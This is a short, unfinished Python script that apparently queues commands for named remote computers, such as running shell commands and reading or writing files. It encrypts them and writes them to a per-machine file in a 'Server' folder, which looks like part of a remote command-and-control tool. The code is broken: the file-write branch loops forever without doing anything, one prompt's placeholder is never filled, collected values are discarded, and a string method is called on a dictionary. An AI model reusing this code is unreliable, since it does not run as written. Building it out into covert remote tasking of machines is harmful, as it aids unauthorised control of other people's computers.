from Encryptor import *

def writecommands():
    computer = input('>')
    commands = get_commands(computer)
    with open(f'Server/{computer.lower()}.txt', 'w', encoding='utf-8') as file:
        file.write(encrypt(commands))

def get_commands(computer):
    commands = {}
    while True:
        command = input('%s>' % computer)
        values = []
        if command == chr(0):
            break
        if command == 'cmd' or command == 'file-read':
            while True:
                value = input('%s:%s>' % (computer, command))
                if value == chr(0):
                    break
                values.append(value)
        elif command == 'file-write':
            while True:
                filename = input('%s:name>')
                    
                
    commands = commands.replace('\'', '"')
    return str(commands)

writecommands()
